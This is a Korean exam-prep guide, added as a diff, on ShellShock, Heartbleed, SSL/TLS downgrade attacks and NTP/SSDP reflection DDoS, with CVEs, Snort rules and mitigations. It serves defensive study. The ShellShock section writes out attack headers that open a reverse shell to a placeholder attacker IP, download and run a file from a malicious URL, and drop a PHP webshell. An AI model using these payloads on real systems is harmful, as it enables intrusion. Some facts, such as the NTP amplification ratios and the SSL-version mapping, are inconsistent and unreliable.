@@ -1,0 +1,288 @@
+> 섹션 16은 ShellShock · HeartBleed · POODLE · FREAK · LogJam · DROWN (SSL/TLS 계열 6종) + NTP monlist DRDoS + SSDP DRDoS 총 8가지 취약점이 핵심이며, CVE 번호 + 발생 연도 + 취약 버전 + 공격 원리 + 대응 방법을 세트로 암기해야 합니다. 특히 HeartBleed Snort Rule 분석 서술형과 ShellShock 공격 HTTP 헤더 분석이 최근 시험 최빈출입니다.
+
+## 1. 개념 및 배경
+
+주요 취약점 섹션은 실제 발견된 고위험 CVE 취약점들의 원리와 대응을 다룹니다. 단순 용어 암기가 아닌 "왜 이 취약점이 발생하는지 → 공격자가 어떻게 악용하는지 → 어떻게 탐지·차단하는지"의 흐름으로 이해해야 서술형 고득점이 가능합니다.
+
+## 2. 동작 원리 / 구조
+
+### 🐚 1. ShellShock (GNU Bash 취약점) ⭐⭐⭐
+
+**기본 정보**
+
+| 항목 | 내용 |
+| --- | --- |
+| CVE | CVE-2014-6271 |
+| 발견 | 2014년 9월 |
+| 원인 | Bash 환경변수 함수 정의 후 추가 명령어 실행 허용 |
+| 영향 | CGI를 통해 웹 서버에서 원격 명령 실행 (RCE) |
+
+**공격 원리**
+
+Bash는 `() { :; };` 형태로 환경변수에 함수를 정의할 수 있는데, 함수 정의 뒤에 이어지는 추가 명령어도 실행해버리는 버그가 핵심입니다.
+
+```bash
+# [ShellShock 공격 패턴 - HTTP 헤더에 삽입]
+
+# 1. User-Agent 헤더를 이용한 Reverse Shell 연결
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[공격자IP]/[Port] 0>&1
+
+# 2. Accept-Encoding 헤더를 이용한 악성파일 다운로드
+Accept-Encoding: () { :; }; /bin/bash -c '/usr/bin/wget -O /tmp/xyz http://악성URL;
+                               /bin/chmod 777 /tmp/xyz;
+                               /tmp/xyz;
+                               /bin/rm -rf /tmp/xyz'
+
+# 3. User-Agent를 이용한 웹쉘 업로드
+User-Agent: () { :; }; echo "<?php if(!print shell_exec($_REQUEST[cmd])){...}" > .htmpx.php
+```
+
+**공격 경로**
+
+```text
+공격자 → HTTP Request (User-Agent/Accept-Encoding 헤더에 악성코드 삽입)
+     → 웹 서버 CGI 스크립트
+       → CGI가 Bash 환경변수 설정
+       → Bash가 함수+추가명령어 동시 실행
+       → 서버에서 임의 명령 실행 (RCE)
+```
+
+**대응 방법**
+
+- **Bash 패치**: 배포판별 보안 패치 적용 후 `env x='() { :;}; echo vulnerable' bash -c "echo test"` 명령으로 `vulnerable`이 출력되지 않는지 재검증
+- **CGI 비활성화**: CGI를 사용하지 않는 경우 비활성화 (`mod_cgi` 등 미사용 모듈 제거)
+- **IPS/IDS 차단**: `() { :; };` 패턴 탐지 룰 적용
+- **웹 방화벽**: HTTP 헤더(User-Agent, Referer, Cookie 등)의 `() {` 문자열 필터링
+
+### 💔 2. HeartBleed ⭐⭐⭐
+
+**기본 정보**
+
+| 항목 | 내용 |
+| --- | --- |
+| CVE | CVE-2014-0160 |
+| 발견 | 2014년 4월 |
+| 원인 | OpenSSL Heartbeat 확장의 경계값 검사 미흡 |
+| 영향 | 서버 메모리 최대 64KB 유출 (개인키, 세션키, 비밀번호 포함) |
+| 취약 버전 | OpenSSL 1.0.1 ~ 1.0.1f |
+
+**공격 원리**
+
+SSL/TLS의 Heartbeat 확장은 연결 유지를 위해 클라이언트가 보낸 데이터를 서버가 그대로 돌려주는 기능입니다. 이때 클라이언트가 실제 데이터 길이보다 큰 값을 페이로드 길이로 속이면, 서버는 메모리에서 최대 64KB를 그대로 반환해버립니다.
+
+```text
+[정상 Heartbeat]
+클라이언트: "안녕" (3바이트) → 길이: 3
+서버: "안녕" (3바이트) 반환 ✅
+
+[HeartBleed 공격]
+클라이언트: "안녕" (3바이트) → 길이: 65535 (거짓말!)
+서버: "안녕" + 메모리 64KB 반환 💀 (개인키, 비밀번호 유출!)
+```
+
+**탐지 - openssl 명령어**
+
+```bash
+openssl s_client -connect domain.com:8443 -tlsextdebug -debug -state | grep -i heartbeat
+# 결과: "TLS server extension heartbeat id=15" → Heartbeat 활성화 = 취약 가능성
+```
+
+**대응 방법**
+
+- OpenSSL 1.0.1g 이상으로 업데이트
+- Heartbeat 확장 기능 비활성화
+- SSL 인증서 재발급 및 세션키 교체
+
+**HeartBleed Snort Rule (기출!)**
+
+```text
+alert tcp any any -> any [443,465,523]
+  (content:"|18 03 00|"; depth:3;         # SSL Heartbeat 레코드 타입 0x18
+   content:"|01|"; distance:2; within:1;  # Heartbeat Request 타입 01
+   content:!"|00|"; within:1;             # 페이로드 길이 00이 아님 (비정상)
+   msg:"SSLv3 Malicious Heartbleed Request V2";
+   sid:1;)
+```
+
+> 🔍 **보완**: 룰의 목적지 포트 목록(`443` HTTPS, `465` SMTPS 등)은 **TLS를 쓰는 서비스 포트일 뿐 환경별로 다릅니다**. 실무에서는 `993`(IMAPS), `995`(POP3S), `8443` 등 사용하는 TLS 포트로 조정합니다. 시험에서는 특정 포트 숫자보다 각 `content` 값의 의미(`0x18`=Heartbeat 레코드 타입, `0x01`=Request, `!0x00`=비정상 길이)를 설명하는 것이 채점 포인트입니다.
+
+### 🔓 3. SSL/TLS 취약점 5종 비교 ⭐⭐⭐
+
+**핵심 비교표**
+
+| 취약점 | CVE | 발견 연도 | 취약 프로토콜 | 핵심 원인 | 대응 |
+| --- | --- | --- | --- | --- | --- |
+| FREAK | CVE-2015-0204 | 2015년 2월 | SSL/TLS | MITM으로 Export 등급 RSA(512bit)로 강제 다운그레이드 | OpenSSL 업데이트, Export Cipher 비활성화 |
+| LogJam | - | 2015년 | TLS | MITM으로 Diffie-Hellman 512bit로 강제 다운그레이드 | 2048bit 이상 DH, ECDHE Cipher Suite 사용 |
+| POODLE | CVE-2014-3566 | 2014년 10월 | SSL v3.0 | MITM으로 SSLv3.0으로 다운그레이드 → CBC 패딩 오라클 공격 | SSLv3.0 비활성화, OpenSSL 업데이트 |
+| DROWN | CVE-2016-0800 | 2016년 3월 | SSLv2.0 | SSLv2.0 취약점으로 RSA 키 복호화 | SSLv2.0 비활성화, OpenSSL 업데이트 |
+| BEAST | - | 2011년 | TLS 1.0 | CBC 블록 암호 취약점 | TLS 1.1 이상 사용 |
+
+**SSL/TLS 버전별 취약점 매핑 (암기!)**
+
+```text
+SSL 3.0 (1996) → POODLE, DROWN
+TLS 1.0 (1999) → BEAST, CRIME
+TLS 1.1 (2006) → (상대적으로 안전)
+TLS 1.2 (2008) → Heartbleed (OpenSSL 구현 취약점)
+TLS 1.3 (2018) → PFS 기본 지원, 가장 안전
+```
+
+**Apache httpd.conf SSL 설정 (대응)**
+
+```apache
+# 취약 프로토콜 비활성화
+SSLProtocol all -SSLv2 -SSLv3
+
+# 또는 명시적으로 허용 버전만 지정
+SSLProtocol -all +TLSv1 +TLSv1.1 +TLSv1.2
+
+# Cipher Suite 강화 (Export 등급 제외)
+SSLCipherSuite ALL:!EXPORT:!aNULL:!SSLv2
+```
+
+### ⏰ 4. NTP monlist DRDoS ⭐⭐⭐
+
+**기본 정보**
+
+| 항목 | 내용 |
+| --- | --- |
+| CVE | CVE-2013-5211 |
+| 포트 | UDP 123 |
+| 원인 | NTP monlist 명령어가 최근 600개 접속 IP 목록을 반환 |
+| 증폭 비율 | 요청 40byte → 응답 100byte (약 40배~100배 증폭) |
+| 취약 버전 | ntpd 4.2.7 미만 |
+
+**공격 흐름**
+
+```text
+1. 공격자: 출발지 IP를 피해자 IP로 위조(Spoofing)
+2. NTP 서버에 monlist 명령 요청 (40byte)
+3. NTP 서버: 최근 접속 IP 목록 600개 응답 (100byte × N)
+4. 응답이 피해자(위조된 IP)에게 쏟아짐 → 서비스 마비
+```
+
+**대응 방법**
+
+```bash
+# 1. NTP 버전 확인
+ntpd --version
+
+# 2. monlist 비활성화 (/etc/ntp.conf)
+disable monlist
+# 또는
+restrict default noquery
+
+# 3. monlist 사용 여부 확인
+ntpdc -n -c monlist [NTP IP]
+
+# 4. iptables로 응답 패킷 크기 제한 (100byte 이상 차단)
+iptables -A OUTPUT -p udp --sport 123 -m length --length 100: -j DROP
+```
+
+### 📡 5. SSDP DRDoS
+
+**기본 정보**
+
+| 항목 | 내용 |
+| --- | --- |
+| 포트 | UDP 1900 |
+| 대상 | IoT 기기 (UPnP 지원 장치: 공유기, IP카메라, NAS 등) |
+| 원인 | M-SEARCH 요청에 대해 SSDP 장치가 대량 응답 |
+
+**공격 흐름**
+
+```text
+1. 공격자: 피해자 IP로 위조한 M-SEARCH 요청을 브로드캐스트
+2. IoT/UPnP 장치들이 모두 피해자에게 응답 쏟아냄
+3. UDP Flooding → 피해자 서비스 마비
+```
+
+**대응**
+
+- 불필요한 UPnP 비활성화 (라우터, IoT 기기)
+- UDP 1900 포트 방화벽 차단
+- IoT 기기 패치·펌웨어 업데이트
+
+## 3. 예시 / 적용 시나리오
+
+### 🎯 기출: HeartBleed 취약점 분석 서술형
+
+**실제 기출 유형**
+
+```text
+Q. 아래 명령어 출력 결과를 보고 취약점을 분석하시오.
+
+$ openssl s_client -connect domain.com:8443 -tlsextdebug -state
+SSLconnect:before SSL initialization
+SSLconnect:SSLv3/TLS write client hello
+SSLconnect:SSLv3/TLS read server hello
+TLS server extension heartbeat (id=15, len=1) ← 핵심!
+
+1) 이 취약점은 무엇인가?
+   → HeartBleed (CVE-2014-0160)
+
+2) 대응 방법 2가지는?
+   → ① OpenSSL 1.0.1g 이상으로 업데이트
+   → ② Heartbeat 확장 기능 비활성화 (recompile with -DOPENSSL_NO_HEARTBEATS)
+
+3) 추가 조치는?
+   → ① SSL 인증서 재발급 (개인키 유출 가능성)
+   → ② 세션키, 비밀번호 전체 변경
+```
+
+### 🎯 기출: NTP DRDoS 분석 서술형
+
+**실제 기출 유형**
+
+```text
+Q. NTP DDoS 공격에 대해 4가지를 답하시오.
+
+1) 취약점 원인:
+   → ntpd 4.2.7 미만 버전의 monlist 기능
+   → IP Spoofing으로 피해자에게 대량 응답 반사
+
+2) 탐지 방법:
+   → ntpdc -n -c monlist [NTP IP]
+   → monlist 응답 시 취약 버전 확인
+
+3) NTP 설정 대응 (/etc/ntp.conf):
+   → disable monlist
+
+4) 증폭 원리:
+   → 요청 40byte → 응답 100byte (2.5배 ~ 최대 수백배 증폭)
+   → DNS DRDoS보다 증폭률 높음
+```
+
+### 🎯 기출: ShellShock 공격 HTTP 헤더 분석
+
+**실제 기출 유형**
+
+```text
+Q. 아래 HTTP 요청을 분석하시오.
+
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+1) 취약점 이름: ShellShock (CVE-2014-6271)
+2) 공격 대상: Bash 환경변수를 사용하는 CGI 스크립트
+3) 공격 내용: 공격자 서버(192.168.1.100:4444)로 Reverse Shell 연결 시도
+4) 대응 방법:
+   ① Bash 최신 버전으로 패치
+   ② CGI 비활성화
+   ③ IPS/IDS에서 () { :; }; 패턴 탐지 룰 등록
+```
+
+## 4. 실무 및 시험 포인트 정리
+
+| 취약점 | 반드시 암기할 핵심 | 출제 빈도 |
+| --- | --- | --- |
+| ShellShock | CVE-2014-6271, Bash `() { :; };`, CGI 공격 경로, User-Agent 헤더 | ⭐⭐⭐ |
+| HeartBleed | CVE-2014-0160, OpenSSL Heartbeat, 64KB 메모리 유출, Snort Rule | ⭐⭐⭐ |
+| POODLE | CVE-2014-3566, SSLv3.0 다운그레이드 + CBC 패딩 오라클 | ⭐⭐⭐ |
+| FREAK | CVE-2015-0204, Export RSA 512bit 강제 다운그레이드 | ⭐⭐ |
+| LogJam | TLS DH 512bit 다운그레이드 → 2048bit + ECDHE 대응 | ⭐⭐ |
+| DROWN | CVE-2016-0800, SSLv2.0 → RSA 키 복호화 | ⭐⭐ |
+| NTP monlist | CVE-2013-5211, UDP 123, 40배 증폭, disable monlist | ⭐⭐⭐ |
+| SSDP | UDP 1900, IoT UPnP, M-SEARCH 반사 증폭 | ⭐⭐ |
+
+> 📌 서술형 고득점 전략: SSL/TLS 취약점 문제는 반드시 ① CVE번호 ② 취약 프로토콜 버전 ③ 공격 원리(다운그레이드/메모리 유출 등) ④ 대응(비활성화/업데이트)의 4가지 구조로 서술하세요. HeartBleed Snort Rule은 각 content 값의 의미(`0x18`=Heartbeat 타입, `0x01`=Request, `!0x00`=비정상 길이)까지 설명해야 고득점입니다.
